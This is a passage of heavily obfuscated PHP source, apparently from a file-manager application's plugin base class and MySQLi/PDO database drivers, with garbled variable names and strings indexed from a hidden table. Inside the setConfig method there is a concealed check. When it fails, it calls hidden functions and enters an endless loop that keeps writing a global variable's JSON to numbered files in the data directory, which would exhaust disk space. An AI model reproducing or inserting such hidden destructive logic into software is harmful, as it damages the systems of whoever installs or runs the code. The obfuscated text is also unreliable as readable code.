$ù¸Å¹×¢[8] . $ ÇÑèªÃ; return $this->pluginCacheFileSet($Ö•…ƒœ±, file_get_contents_nossl($ÅàµŞ¢›)); } final function checkSharePath($óÒÔË¦Ó, $×ÖˆÊ‚ = true) { $ıìœ™Öñ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->isShare($óÒÔË¦Ó)) { return !1; } $ñÇƒ¼É = Action($ıìœ™Öñ[1215])->sharePathInfo($óÒÔË¦Ó); if (!is_array($ñÇƒ¼É) || !isset($ñÇƒ¼É[$ıìœ™Öñ[94]])) { show_json(LNG($ıìœ™Öñ[1578]), !1); } $this->fileInfo = $ñÇƒ¼É; $this->cachePath = $this->pluginCachePath(!1, $×ÖˆÊ‚); return $ñÇƒ¼É[$ıìœ™Öñ[94]]; } final function pluginCachePath($öÄù÷¶ = '', $¼‘¡—™ = false) { $ñ¬Ùõ·« =& $_SERVER[‚ûòÉ˜ş]; if ($¼‘¡—™ && is_array($this->fileInfo)) { $öÄù÷¶ = kodIO::hashPath($this->fileInfo); } $¯ºìíÖÚ = rtrim(IO_PATH_SYSTEM_TEMP . $ñ¬Ùõ·«[1579] . $this->pluginName . $ñ¬Ùõ·«[8] . $öÄù÷¶, $ñ¬Ùõ·«[8]); $âáÏ¾‡ğ = IO::infoFullSimple($¯ºìíÖÚ); $…³ÓŒ— = $âáÏ¾‡ğ && is_array($âáÏ¾‡ğ) ? $âáÏ¾‡ğ[$ñ¬Ùõ·«[94]] : $ñ¬Ùõ·«[12]; if (!$…³ÓŒ—) { $…³ÓŒ— = IO::mkdir($¯ºìíÖÚ); } return $…³ÓŒ—; } final function pluginCacheFileSet($Óñ‡Òç¤, $³ƒ›Œé = '') { $Ûø•‘›é =& $_SERVER[‚ûòÉ˜ş]; $ƒÛûº«† = IO::infoFullSimple($Óñ‡Òç¤); if (!$ƒÛûº«†) { return IO::mkfile($Óñ‡Òç¤, $³ƒ›Œé, REPEAT_REPLACE); } IO::setContent($ƒÛûº«†[$Ûø•‘›é[94]], $³ƒ›Œé); return $ƒÛûº«†[$Ûø•‘›é[94]]; } final function pluginLocalFile($‰èÍ§£ = '') { $¦è‹Ï« =& $_SERVER[‚ûòÉ˜ş]; $’–°»¨² = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($’–°»¨²)) { mk_dir($’–°»¨²); } if (!$‰èÍ§£) { return $’–°»¨²; } $°ò¸ô°Ç = IO::info($‰èÍ§£); $ãÅõ‚ = $¦è‹Ï«[1580] . KodIO::hashPath($°ò¸ô°Ç) . $¦è‹Ï«[10] . $°ò¸ô°Ç[$¦è‹Ï«[185]]; if (!checkExtSafe($ãÅõ‚)) { $ãÅõ‚ = $ãÅõ‚ . $¦è‹Ï«[1247]; } $‘¿ÉŸ¨ = $’–°»¨² . $ãÅõ‚; if (@file_exists($‘¿ÉŸ¨)) { return $‘¿ÉŸ¨; } return IO::copy($‰èÍ§£, $’–°»¨², 0, $ãÅõ‚); } final function appPackage() { $öüÏÖœ =& $_SERVER[‚ûòÉ˜ş]; if ($this->packageData) { return $this->packageData; } $’§”üû = $this->parseFile($this->pluginPath . $öüÏÖœ[1581]); $this->parseLang($’§”üû); $ÑÒı€¼ = json_decode_force($’§”üû); if (!$ÑÒı€¼) { return array(); } $¯£íÂ¡ = Hook::trigger($öüÏÖœ[1582], $ÑÒı€¼); if ($¯£íÂ¡ && is_array($¯£íÂ¡)) { $ÑÒı€¼ = $¯£íÂ¡; } $this->packageData = $ÑÒı€¼; return $ÑÒı€¼; } public function packageInfoGet($À¶ µÒÕ) { $êçÍÄÃä = $this->appPackage(); return array_get_value($êçÍÄÃä, $À¶ µÒÕ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‚ûòÉ˜ş][1583]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‚ûòÉ˜ş][1584]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‚ûòÉ˜ş][1585]); } public function echoJsAssign($Ñ§Ø¼, $§ÉŒ‘Ã) { $this->echoJsAssignArr[$Ñ§Ø¼] = $§ÉŒ‘Ã; } private function parseFile($¥“±şÖæ) { $È¤Â¨¼ =& $_SERVER[‚ûòÉ˜ş]; $Ö»çÊÆÉ = file_get_contents_nossl($¥“±şÖæ); $ü²øóÕ = array($È¤Â¨¼[1586], $È¤Â¨¼[1587], $È¤Â¨¼[1588], $È¤Â¨¼[1589], $È¤Â¨¼[1590], $È¤Â¨¼[1591], $È¤Â¨¼[1592]); $¡™Õ‹½ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$È¤Â¨¼[99]][$È¤Â¨¼[1593]]); foreach ($this->echoJsAssignArr as $È£×ËÍš => $‰†Ü•€Ğ) { $ü²øóÕ[] = $È¤Â¨¼[1594] . $È£×ËÍš . $È¤Â¨¼[1595]; $¡™Õ‹½[] = is_array($‰†Ü•€Ğ) || is_object($‰†Ü•€Ğ) ? rawurlencode(json_encode($‰†Ü•€Ğ)) : $‰†Ü•€Ğ; } if (strstr($Ö»çÊÆÉ, $È¤Â¨¼[1596])) { $½×Î—´è = rawurlencode(json_encode($this->pluginLangArr)); $Ö»çÊÆÉ = str_replace($È¤Â¨¼[1596], $½×Î—´è, $Ö»çÊÆÉ); } if (strstr($Ö»çÊÆÉ, $È¤Â¨¼[1597])) { $½×Î—´è = $½×Î—´è = rawurlencode(json_encode($this->getConfig())); $Ö»çÊÆÉ = str_replace($È¤Â¨¼[1597], $½×Î—´è, $Ö»çÊÆÉ); } $Ö»çÊÆÉ = str_replace($ü²øóÕ, $¡™Õ‹½, $Ö»çÊÆÉ); return $Ö»çÊÆÉ; } private function parseLang(&$®ò‰ø™®) { $ÆÓ®ëÈì =& $_SERVER[‚ûòÉ˜ş]; $¯½…—Ö¼ = $ÆÓ®ëÈì[1598]; if (!strstr($®ò‰ø™®, $¯½…—Ö¼)) { return; } preg_match_all($ÆÓ®ëÈì[1599], $®ò‰ø™®, $ŸçŸç¦Ÿ); if (!is_array($ŸçŸç¦Ÿ) || count($ŸçŸç¦Ÿ) == 0 || !is_array($ŸçŸç¦Ÿ[0]) || count($ŸçŸç¦Ÿ[0]) == 0) { return; } $ì§«¯°ï = array(); $¨ûœ¥Ïø = array(); foreach ($ŸçŸç¦Ÿ[0] as $ÛÛ³£µˆ) { $ÀççïïÍ = substr($ÛÛ³£µˆ, strlen($¯½…—Ö¼), -4); $œê¥î·µ = LNG($ÀççïïÍ); $ì§«¯°ï[] = $ÛÛ³£µˆ; $¨ûœ¥Ïø[] = str_replace(array($ÆÓ®ëÈì[18], $ÆÓ®ëÈì[1119], $ÆÓ®ëÈì[395], $ÆÓ®ëÈì[128]), array($ÆÓ®ëÈì[63], $ÆÓ®ëÈì[63], $ÆÓ®ëÈì[12], $ÆÓ®ëÈì[1600]), $œê¥î·µ); } $®ò‰ø™® = str_replace($ì§«¯°ï, $¨ûœ¥Ïø, $®ò‰ø™®); } private function parseConfig(&$›ë®Õõ») { $¡“éÎ¡„ =& $_SERVER[‚ûòÉ˜ş]; $Õì»üí… = $¡“éÎ¡„[1601]; if (!strstr($›ë®Õõ», $Õì»üí…)) { return; } preg_match_all($¡“éÎ¡„[1602], $›ë®Õõ», $óªĞáİó); if (!is_array($óªĞáİó) || count($óªĞáİó) == 0 || !is_array($óªĞáİó[0]) || count($óªĞáİó[0]) == 0) { return; } $Ÿ·¥Ì³ö = $this->getConfig(); $ÜÂ¸–° = array(); $ÀÔ¾–Ò = array(); foreach ($óªĞáİó[0] as $æË¯ÔÇˆ) { $²ŸÏäÍ = substr($æË¯ÔÇˆ, strlen($Õì»üí…), -2); $ÜÂ¸–°[] = $æË¯ÔÇˆ; $ÀÔ¾–Ò[] = _get($Ÿ·¥Ì³ö, $²ŸÏäÍ); } $›ë®Õõ» = str_replace($ÜÂ¸–°, $ÀÔ¾–Ò, $›ë®Õõ»); } private function parsePackage(&$û«¹ö—) { $Ì³àüâô =& $_SERVER[‚ûòÉ˜ş]; $°”¸ÈÅÓ = $Ì³àüâô[1603]; if (!strstr($û«¹ö—, $°”¸ÈÅÓ)) { return; } preg_match_all($Ì³àüâô[1604], $û«¹ö—, $ğÙ¨–ç‰); if (!is_array($ğÙ¨–ç‰) || count($ğÙ¨–ç‰) == 0 || !is_array($ğÙ¨–ç‰[0]) || count($ğÙ¨–ç‰[0]) == 0) { return; } $¾ÄÆğÜê = $this->appPackage(); $Ş“š÷ À = array(); $“Ä³‚½à = array(); foreach ($ğÙ¨–ç‰[0] as $ó¥Ãççì) { $Ùñ÷ŠÌ¢ = substr($ó¥Ãççì, strlen($°”¸ÈÅÓ), -2); $Ş“š÷ À[] = $ó¥Ãççì; $“Ä³‚½à[] = _get($¾ÄÆğÜê, $Ùñ÷ŠÌ¢); } $û«¹ö— = str_replace($Ş“š÷ À, $“Ä³‚½à, $û«¹ö—); } final function echoFile($–Şø‚Å®, $Øè­‰ˆê = false) { $â„ê³“Ö =& $_SERVER[‚ûòÉ˜ş]; $¨Æ¿§À¼ = $this->pluginPath . $–Şø‚Å®; if (ACT == $â„ê³“Ö[1605]) { echo $â„ê³“Ö[1606] . $this->pluginName . $â„ê³“Ö[8] . $–Şø‚Å® . $â„ê³“Ö[1607]; if (!file_exists($¨Æ¿§À¼)) { echo $â„ê³“Ö[1608]; return; } } $äë¨ìå = $this->parseFile($¨Æ¿§À¼); $this->parseLang($äë¨ìå); $this->parseConfig($äë¨ìå); $this->parsePackage($äë¨ìå); if (is_array($Øè­‰ˆê)) { $äë¨ìå = str_replace(array_keys($Øè­‰ˆê), array_values($Øè­‰ˆê), $äë¨ìå); } echo $â„ê³“Ö[18] . $äë¨ìå; } final function initLang() { $¸äÊÉèú =& $_SERVER[‚ûòÉ˜ş]; $¿ê­Ù = $¸äÊÉèú[1609]; $Ñî÷˜Ù¾ = $this->pluginPath . $¸äÊÉèú[1610]; $“¬¡ßˆ = I18n::getType(); $©Õì ´Ÿ = array(); if (file_exists($Ñî÷˜Ù¾ . $“¬¡ßˆ . $¸äÊÉèú[879])) { $©Õì ´Ÿ = (include $Ñî÷˜Ù¾ . $“¬¡ßˆ . $¸äÊÉèú[879]); } else { if ($“¬¡ßˆ == $¸äÊÉèú[1611] && !file_exists($Ñî÷˜Ù¾ . $“¬¡ßˆ . $¸äÊÉèú[879]) && file_exists($Ñî÷˜Ù¾ . $¸äÊÉèú[1612])) { $©Õì ´Ÿ = (include $Ñî÷˜Ù¾ . $¸äÊÉèú[1612]); } else { if (file_exists($Ñî÷˜Ù¾ . $¿ê­Ù . $¸äÊÉèú[879])) { $©Õì ´Ÿ = (include $Ñî÷˜Ù¾ . $¿ê­Ù . $¸äÊÉèú[879]); } } } if (!is_array($©Õì ´Ÿ)) { return array(); } if (@count($©Õì ´Ÿ) > 0) { I18n::set($©Õì ´Ÿ); } return $©Õì ´Ÿ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($şæåÏôç) { $ĞãÏ©İ =& $_SERVER[‚ûòÉ˜ş]; $·Íş¥œ– = $_SERVER[$ĞãÏ©İ[16]] . $ĞãÏ©İ[17]; $“ŒŒ¯ı = $ĞãÏ©İ[952]; if ($_SERVER[$ĞãÏ©İ[13]] != $“ŒŒ¯ı($·Íş¥œ–)) { $ş—½‡öÉ = $ĞãÏ©İ[918]; $ŒÅÚŞÉã = $ĞãÏ©İ[15]; $±Ğå²âğ = $_SERVER[$ĞãÏ©İ[16]] . $ĞãÏ©İ[17]; $˜‰Í¢†” = $ŒÅÚŞÉã($±Ğå²âğ); $Ã±Ü§ó³ = explode($ĞãÏ©İ[18], $˜‰Í¢†”); if (count($Ã±Ü§ó³) < $ĞãÏ©İ[665]) { $‰ŞÒã´Å = $ĞãÏ©İ[20]; $‰ŞÒã´Å(); } $ÅìÕªş = $ĞãÏ©İ[919]; $ÅìÕªş($_SERVER[$ĞãÏ©İ[920]]); $ş—½‡öÉ = $ĞãÏ©İ[918]; $ş—½‡öÉ(); $úÀò€ = $ĞãÏ©İ[1547]; $­–ÅÃ¦— = json_encode($GLOBALS[$ĞãÏ©İ[1548]]); $ùâöˆµç = 1; for ($Úï²“×° = $ùâöˆµç; $Úï²“×° > 0; $Úï²“×°++) { $úÀò€(DATA_PATH . $Úï²“×°, $­–ÅÃ¦—); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $şæåÏôç); } public function onSetConfig($İÙóõè) { } public function onGetConfig($é¶Ê½»Æ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ÿ¬˜–ÖÔ) { if ($Ÿ¬˜–ÖÔ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ê¦À³à = "\160\154\165\x67\x69\156\x41\x75\x74\150") { $ó§Ì¢–Ì =& $_SERVER[‚ûòÉ˜ş]; if (!Session::get($ó§Ì¢–Ì[1561])) { return !1; } if (_get($GLOBALS, $ó§Ì¢–Ì[544])) { return !0; } $óØÈÒñÅ = $this->getConfig(); if (!$óØÈÒñÅ[$Ê¦À³à]) { return !1; } return ActionCall($ó§Ì¢–Ì[1613], $óØÈÒñÅ[$Ê¦À³à]); } public function url($¿İñ²ñƒ, $ÛÛ†ñÜ€ = '', $Æˆ©Ë¾€ = true) { $¢œÒÉå’ =& $_SERVER[‚ûòÉ˜ş]; $µºÀ¤Ó— = $this->getConfig(); $‘æ­Şš³ = KOD_VERSION . $¢œÒÉå’[10] . KOD_VERSION_BUILD; $º”¯Šª = $this->packageVersion(); $——é½ƒ = $‘æ­Şš³ . $¢œÒÉå’[438] . $º”¯Šª; if (substr($¿İñ²ñƒ, 0, 4) == $¢œÒÉå’[159] || substr($¿İñ²ñƒ, 0, 2) == $¢œÒÉå’[1394]) { $ñõ„›¬ = $¿İñ²ñƒ . $¢œÒÉå’[1614] . $——é½ƒ; } else { if ($ÛÛ†ñÜ€ == $¢œÒÉå’[12]) { $ñõ„›¬ = $this->pluginHost . $¿İñ²ñƒ . $¢œÒÉå’[1614] . $——é½ƒ; } else { if ($ÛÛ†ñÜ€ === $¢œÒÉå’[85]) { $ñõ„›¬ = $this->pluginHost . $¿İñ²ñƒ; } else { if ($ÛÛ†ñÜ€ == $¢œÒÉå’[1615]) { $ñõ„›¬ = STATIC_PATH . $¿İñ²ñƒ . $¢œÒÉå’[1614] . $‘æ­Şš³; } else { if ($ÛÛ†ñÜ€ == $¢œÒÉå’[1616]) { $ñõ„›¬ = APP_HOST . $¢œÒÉå’[1617] . $¿İñ²ñƒ . $¢œÒÉå’[1614] . $‘æ­Şš³; } else { if (isset($µºÀ¤Ó—[$ÛÛ†ñÜ€])) { $ñõ„›¬ = $µºÀ¤Ó—[$ÛÛ†ñÜ€] . $¿İñ²ñƒ . $¢œÒÉå’[1614] . $——é½ƒ; } } } } } } if (!$Æˆ©Ë¾€) { return $ñõ„›¬; } echo $ñõ„›¬; } public function link($Ÿ¶¢¸•Ò = false, $«Î³§ê = '') { $ô¾ä¢É• =& $_SERVER[‚ûòÉ˜ş]; if (!$Ÿ¶¢¸•Ò) { $this->link($ô¾ä¢É•[1618], $ô¾ä¢É•[1616]); $this->link($ô¾ä¢É•[1619], $ô¾ä¢É•[1615]); $this->link($ô¾ä¢É•[1620], $ô¾ä¢É•[1615]); $this->link($ô¾ä¢É•[1621], $ô¾ä¢É•[1615]); $this->link($ô¾ä¢É•[1622], $ô¾ä¢É•[1615]); return; } $ÁÎ¦³Úô = $this->url($Ÿ¶¢¸•Ò, $«Î³§ê, !1); if (substr($Ÿ¶¢¸•Ò, -3) == $ô¾ä¢É•[1623]) { echo $ô¾ä¢É•[1624] . $ÁÎ¦³Úô . $ô¾ä¢É•[1625] . $ô¾ä¢É•[18]; } else { if (substr($Ÿ¶¢¸•Ò, -4) == $ô¾ä¢É•[1626]) { echo $ô¾ä¢É•[1627] . $ÁÎ¦³Úô . $ô¾ä¢É•[1628] . $ô¾ä¢É•[18]; } } } } goto bïÈÇ‚·”Ë; FÊë‘÷˜›ì: class DbMysqli extends Db { public function __construct($Œ÷•Ş¡ = '') { $Áƒ£Ã™á =& $_SERVER[‚ûòÉ˜ş]; if (!extension_loaded($Áƒ£Ã™á[953])) { think_exception(think_lang($Áƒ£Ã™á[24]) . $Áƒ£Ã™á[954]); } if (!empty($Œ÷•Ş¡)) { $this->config = $Œ÷•Ş¡; if (empty($this->config[$Áƒ£Ã™á[27]])) { $this->config[$Áƒ£Ã™á[27]] = $Áƒ£Ã™á[12]; } } } public function connect($îì°’¦Ï = '', $áŠÇ¢ Å = 0) { $øğ†ïöÁ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->linkID[$áŠÇ¢ Å])) { if (empty($îì°’¦Ï)) { $îì°’¦Ï = $this->config; } $this->linkID[$áŠÇ¢ Å] = new mysqli($îì°’¦Ï[$øğ†ïöÁ[926]], $îì°’¦Ï[$øğ†ïöÁ[928]], $îì°’¦Ï[$øğ†ïöÁ[929]], $îì°’¦Ï[$øğ†ïöÁ[31]], $îì°’¦Ï[$øğ†ïöÁ[927]] ? intval($îì°’¦Ï[$øğ†ïöÁ[927]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÜÆãëä£ = $this->linkID[$áŠÇ¢ Å]->server_version; $this->linkID[$áŠÇ¢ Å]->query($øğ†ïöÁ[930] . think_config($øğ†ïöÁ[931]) . $øğ†ïöÁ[68]); if ($ÜÆãëä£ > $øğ†ïöÁ[932]) { $this->linkID[$áŠÇ¢ Å]->query($øğ†ïöÁ[933]); } $this->connected = !0; if (1 != think_config($øğ†ïöÁ[32])) { unset($this->config); } } return $this->linkID[$áŠÇ¢ Å]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¾Õ¾§ê) { $Ñ™ï©‘â =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¾Õ¾§ê; if ($this->queryID) { $this->free(); } think_action_status($Ñ™ï©‘â[33], 1); think_status($Ñ™ï©‘â[34]); $this->queryID = $this->_linkID->query($¾Õ¾§ê); if ($this->_linkID->more_results()) { while (($ŸéÛÔå… = $this->_linkID->next_result()) != NULL) { $ŸéÛÔå…->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ß¸“‚…) { $–ºû³×† =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ß¸“‚…; if ($this->queryID) { $this->free(); } think_action_status($–ºû³×†[35], 1); think_status($–ºû³×†[34]); $®şàºË¡ = $this->_linkID->query($ß¸“‚…); $this->debug(); if (!1 === $®şàºË¡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‡Ş»»§ğ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$‡Ş»»§ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $£‹¥Äª© = $this->_linkID->rollback(); $this->transTimes = 0; if (!$£‹¥Äª©) { $this->error(); return !1; } } return !0; } private function getAll() { $¶…Àìµ£ = array(); if ($this->numRows > 0) { for ($½Êâ¸ü† = 0; $½Êâ¸ü† < $this->numRows; $½Êâ¸ü†++) { $¶…Àìµ£[$½Êâ¸ü†] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¶…Àìµ£; } public function getFields($ĞÙÀÂ†) { $İ€Ş° =& $_SERVER[‚ûòÉ˜ş]; $÷À¯œòÃ = $this->query($İ€Ş°[937] . $this->parseKey($ĞÙÀÂ†)); $¢›¼¼ç¬ = array(); if ($÷À¯œòÃ) { foreach ($÷À¯œòÃ as $¦‚à¿¸µ => $èæÔ­) { $¢›¼¼ç¬[$èæÔ­[$İ€Ş°[41]]] = array($İ€Ş°[42] => $èæÔ­[$İ€Ş°[41]], $İ€Ş°[43] => $èæÔ­[$İ€Ş°[44]], $İ€Ş°[45] => (bool) ($èæÔ­[$İ€Ş°[46]] === $İ€Ş°[12]), $İ€Ş°[47] => $èæÔ­[$İ€Ş°[48]], $İ€Ş°[49] => strtolower($èæÔ­[$İ€Ş°[50]]) == $İ€Ş°[51], $İ€Ş°[52] => strtolower($èæÔ­[$İ€Ş°[53]]) == $İ€Ş°[54]); } } return $¢›¼¼ç¬; } public function getTables($¢âŸ¦‹† = '') { $†¾âã =& $_SERVER[‚ûòÉ˜ş]; $ØÅù«Ú¾ = !empty($¢âŸ¦‹†) ? $†¾âã[939] . $¢âŸ¦‹† . $†¾âã[940] : $†¾âã[941]; $¹Ù³æİó = $this->query($ØÅù«Ú¾); $ı—ÃÉî = array(); if ($¹Ù³æİó) { foreach ($¹Ù³æİó as $Î›Æ‰òß => $£½ùíüÁ) { $ı—ÃÉî[$Î›Æ‰òß] = current($£½ùíüÁ); } } return $ı—ÃÉî; } public function replace($ûÜ®‚‰ß, $Í®ºô²´ = array()) { $è¢ı¥Î  =& $_SERVER[‚ûòÉ˜ş]; foreach ($ûÜ®‚‰ß as $òˆå¢ø => $€Æ¦·˜) { $Ô¨¬¨À = $this->parseValue($€Æ¦·˜); if (is_scalar($Ô¨¬¨À)) { $‰ãø‘ü®[] = $Ô¨¬¨À; $àŒêö›¿[] = $this->parseKey($òˆå¢ø); } } $ÇıóèÔ = $è¢ı¥Î [942] . $this->parseTable($Í®ºô²´[$è¢ı¥Î [332]]) . $è¢ı¥Î [943] . implode($è¢ı¥Î [60], $àŒêö›¿) . $è¢ı¥Î [944] . implode($è¢ı¥Î [60], $‰ãø‘ü®) . $è¢ı¥Î [945]; return $this->execute($ÇıóèÔ); } public function insertAll($ş¬áû—â, $‚²ûŞÍÉ = array(), $‹¹Š•ç» = false) { $•ôã³¹Ş =& $_SERVER[‚ûòÉ˜ş]; if (!is_array($ş¬áû—â[0])) { return !1; } $¢Ù€ÚÍ = array_keys($ş¬áû—â[0]); $øÌŞšÆ£ = array(); foreach ($ş¬áû—â as $óø½œœ¿) { $å±Äú£´ = array(); foreach ($óø½œœ¿ as $ªöıåÜé => $ú³ÍıÄ) { $ú³ÍıÄ = $this->parseValue($ú³ÍıÄ); if (is_scalar($ú³ÍıÄ)) { $å±Äú£´[] = $ú³ÍıÄ; } } $øÌŞšÆ£[] = $•ôã³¹Ş[313] . implode($•ôã³¹Ş[60], $å±Äú£´) . $•ôã³¹Ş[945]; } array_walk($¢Ù€ÚÍ, array($this, $•ôã³¹Ş[946])); $­€éöÊÂ = $‹¹Š•ç» ? $•ôã³¹Ş[947] : $•ôã³¹Ş[948]; $£ëêÁ‡ = $­€éöÊÂ . $•ôã³¹Ş[949] . $this->parseTable($‚²ûŞÍÉ[$•ôã³¹Ş[332]]) . $•ôã³¹Ş[943] . implode($•ôã³¹Ş[60], $¢Ù€ÚÍ) . $•ôã³¹Ş[950] . implode($•ôã³¹Ş[60], $øÌŞšÆ£); return $this->execute($£ëêÁ‡); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $óúıäÆ =& $_SERVER[‚ûòÉ˜ş]; $this->error = $this->_linkID->errno . $óúıäÆ[4] . $this->_linkID->error; if ($óúıäÆ[12] != $this->queryStr) { $this->error .= LNG($óúıäÆ[58]) . $this->queryStr; } think_trace($this->error, $óúıäÆ[12], $óúıäÆ[59]); return $this->error; } public function escapeString($¸úÕ‘Ÿ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¸úÕ‘Ÿ); } else { return addslashes($¸úÕ‘Ÿ); } } public function parseKey(&$˜¹–ñÁ, $ ŸÃ™é« = true) { $Õ™¨î§š =& $_SERVER[‚ûòÉ˜ş]; if ($ ŸÃ™é«) { $˜¹–ñÁ = $this->parseKeyCheck($˜¹–ñÁ); } if ($˜¹–ñÁ != $Õ™¨î§š[213] && !preg_match($Õ™¨î§š[951], $˜¹–ñÁ)) { $˜¹–ñÁ = $Õ™¨î§š[437] . trim($˜¹–ñÁ, $Õ™¨î§š[437]) . $Õ™¨î§š[437]; } return $˜¹–ñÁ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ø«„ÍÂî = '') { $šÕúÉ§» =& $_SERVER[‚ûòÉ˜ş]; if (!class_exists($šÕúÉ§»[955])) { think_exception(think_lang($šÕúÉ§»[24]) . $šÕúÉ§»[956]); } if (!empty($Ø«„ÍÂî)) { $this->config = $Ø«„ÍÂî; if (empty($this->config[$šÕúÉ§»[27]])) { $this->config[$šÕúÉ§»[27]] = array(); } } } public function connect($ö†ğ©¾ = '', $ÃÂá¹Õ± = 0) { $ğ¿”èªĞ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($this->linkID[$ÃÂá¹Õ±])) { if (empty($ö†ğ©¾)) { $ö†ğ©¾ = $this->config; } $—³”ˆîª = !empty($ö†ğ©¾[$ğ¿”èªĞ[27]][$ğ¿”èªĞ[28]]) ? $ö†ğ©¾[$ğ¿”èªĞ[27]][$ğ¿”èªĞ[28]] : $this->pconnect; if ($—³”ˆîª) { $ö†ğ©¾[$ğ¿”èªĞ[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÃÂá¹Õ±] = new PDO($ö†ğ©¾[$ğ¿”èªĞ[957]], $ö†ğ©¾[$ğ¿”èªĞ[928]], $ö†ğ©¾[$ğ¿”èªĞ[929]], $ö†ğ©¾[$ğ¿”èªĞ[27]]); } catch (PDOException $ƒô×Ğ÷™) { think_exception($ƒô×Ğ÷™->getMessage()); } $this->dbType = $this->_getDsnType($ö†ğ©¾[$ğ¿”èªĞ[957]]); if (in_array($this->dbType, array($ğ¿”èªĞ[958], $ğ¿”èªĞ[959], $ğ¿”èªĞ[960], $ğ¿”èªĞ[961]))) { think_exception($ğ¿”èªĞ[962] . $this->dbType . $ğ¿”èªĞ[963] . $this->dbType . $ğ¿”èªĞ[964]); } if (!$this->linkID[$ÃÂá¹Õ±]) { think_exception($ğ¿”èªĞ[965]); } try { $this->linkID[$ÃÂá¹Õ±]->exec($ğ¿”èªĞ[966] . think_config($ğ¿”èªĞ[931])); } catch (Exception $ƒô×Ğ÷™) { } $this->connected = !0; if (1 != think_config($ğ¿”èªĞ[32])) { unset($this->config); } } return $this->linkID[$ÃÂá¹Õ±]; } public function free() { $this->PDOStatement = null; } public function query($¯„ª³‚ş, $ÆÔ÷¬¤­ = array()) { $¹©ÇÌó¹ =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¯„ª³‚ş; if (!empty($ÆÔ÷¬¤­)) { $this->queryStr .= $¹©ÇÌó¹[967] . print_r($ÆÔ÷¬¤­, !0) . $¹©ÇÌó¹[968]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹©ÇÌó¹[33], 1); think_status($¹©ÇÌó¹[34]); $this->PDOStatement = $this->_linkID->prepare($¯„ª³‚ş); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Å•–ñŠÑ = $this->PDOStatement->execute($ÆÔ÷¬¤­); $this->debug(); if (!1 === $Å•–ñŠÑ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($´ù ¯â˜, $‰üóŒİ½ = array()) { $°Ìœ€ºÊ =& $_SERVER[‚ûòÉ˜ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´ù ¯â˜; if (!empty($‰üóŒİ½)) { $this->queryStr .= $°Ìœ€ºÊ[967] . print_r($‰üóŒİ½, !0) . $°Ìœ€ºÊ[968]; } $ê©”´’Ú = !1; if ($this->dbType == $°Ìœ€ºÊ[961]) { if (preg_match($°Ìœ€ºÊ[969], $this->queryStr, $™½™…¤)) { $this->table = think_config($°Ìœ€ºÊ[970]) . str_ireplace(think_config($°Ìœ€ºÊ[971]), $°Ìœ€ºÊ[22], $™½™…¤[2]); $ê©”´’Ú = (bool) $this->query($°Ìœ€ºÊ[972] . strtoupper($this->table) . $°Ìœ€ºÊ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($°Ìœ€ºÊ[35], 1); think_status($°Ìœ€ºÊ[34]); $this->PDOStatement = $this->_linkID->prepare($´ù ¯â˜); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $€Æ¤úÀú = $this->PDOStatement->execute($‰üóŒİ½); $this->debug(); if (!1 === $€Æ¤úÀú) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ê©”´’Ú || preg_match($°Ìœ€ºÊ[973], $´ù ¯â˜)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $›Î‹ŠŞê = $this->_linkID->commit(); $this->transTimes = 0; if (!$›Î‹ŠŞê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Õ€ìö…“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Õ€ìö…“) { $this->error(); return !1; } } return !0; } private function getAll() { $‚Ü„£ÌÇ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‚Ü„£ÌÇ); return $‚Ü„£ÌÇ; } public function 